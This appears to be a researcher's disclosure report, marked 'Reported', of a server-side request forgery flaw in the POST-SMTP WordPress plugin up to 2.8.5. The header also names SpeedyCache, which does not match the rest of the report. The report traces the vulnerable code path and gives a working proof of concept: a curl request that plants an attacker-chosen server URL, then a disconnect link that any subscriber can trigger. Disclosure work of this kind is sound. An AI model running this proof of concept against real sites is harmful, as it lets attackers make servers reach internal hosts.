### POST-SMTP<= 2.8.5 SSRF

SpeedyCache <= 2.8.5

Source: `WP_REST_Request::get_header`

Sink: `wp_remote_post`

Code: 

Postman/Mobile/includes/rest-api/v1/rest-api.php

```
public function connect_app( WP_REST_Request $request ) {
  ...
  $server_url = $request->get_header( 'server_url' );
  ...
  update_option( 'post_smtp_server_url', $server_url );
}

function update_option( $option, $value, $autoload = null ) {
  ...
  $result = $wpdb->update( $wpdb->options, $update_args, array( 'option_name' => $option ) );
}
```

Postman/Mobile/includes/controller/v1/controller.php

```
public function disconnect_app() {
  ...
  $server_url = get_option( 'post_smtp_server_url' );
  ...
  $response = wp_remote_post(
					"{$server_url}/disconnect-app",
  ...
				);
}
```

POC:

1. Listen on 8888 on server side

2. Send the following curl request to set the server

   ```
   curl --location --request POST 'http://test-server/wp-json/post-smtp/v1/connect-app' \
   --header 'auth-key;' \
   --header 'server-url: http://127.0.0.1:8888' \
   --header 'fcm-token: bbbb'
   ```

3. Login (subscriber is also ok), visit `http://test-server/wp-admin/admin.php?action=post_smtp_disconnect_app&auth_token=bbbb`

4. Receive a request on server side. 

Status: Reported